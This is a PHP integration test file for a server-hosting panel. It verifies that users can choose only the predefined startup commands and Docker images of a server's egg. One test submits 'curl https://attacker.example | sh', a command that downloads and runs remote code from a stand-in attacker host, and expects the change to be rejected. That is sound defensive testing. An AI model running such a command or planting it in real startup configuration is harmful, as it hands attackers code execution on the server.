<?php

use App\Models\Server;
use App\Tests\Integration\IntegrationTestCase;
use Filament\Facades\Filament;
use Livewire\Livewire;
use PluggedHost\Servers\Filament\Server\Pages\ServerSettings;

require_once __DIR__ . '/../../../plugged-host-core/tests/Support/load-plugin.php';

uses(IntegrationTestCase::class);

beforeEach(function () {
    loadPluginForTest('plugged-host-servers');
    loadPluginForTest('plugged-host-minecraft');
    Filament::setCurrentPanel('server');
});

afterEach(fn () => Filament::setCurrentPanel(null));

function serverWithEggChoices(): array
{
    [$user, $server] = generateTestAccount();

    $server->egg->forceFill([
        'startup_commands' => ['Default' => 'java -jar server.jar', 'More memory' => 'java -Xmx2G -jar server.jar'],
        'docker_images' => ['Java 21' => 'ghcr.io/example/java:21', 'Java 17' => 'ghcr.io/example/java:17'],
    ])->save();
    $server->forceFill(['startup' => 'java -jar server.jar', 'image' => 'ghcr.io/example/java:21'])->save();

    return [$user, $server->fresh()];
}

it('refuses a startup command that is not one of the egg\'s', function () {
    [$user, $server] = serverWithEggChoices();
    $this->actingAs($user);
    Filament::setTenant($server);

    Livewire::test(ServerSettings::class)
        ->set('data.startup_select', 'curl https://attacker.example | sh')
        ->assertForbidden();

    expect($server->refresh()->startup)->toBe('java -jar server.jar');
});

it('refuses a docker image that is not one of the egg\'s', function () {
    [$user, $server] = serverWithEggChoices();
    $this->actingAs($user);
    Filament::setTenant($server);

    Livewire::test(ServerSettings::class)
        ->set('data.image', 'attacker/anything:latest')
        ->assertForbidden();

    expect($server->refresh()->image)->toBe('ghcr.io/example/java:21');
});

it('switches to another of the egg\'s startup commands and images', function () {
    [$user, $server] = serverWithEggChoices();
    $this->actingAs($user);
    Filament::setTenant($server);

    Livewire::test(ServerSettings::class)
        ->set('data.startup_select', 'java -Xmx2G -jar server.jar')
        ->set('data.image', 'ghcr.io/example/java:17')
        ->assertSuccessful();

    $server->refresh();
    expect($server->startup)->toBe('java -Xmx2G -jar server.jar')
        ->and($server->image)->toBe('ghcr.io/example/java:17');
});
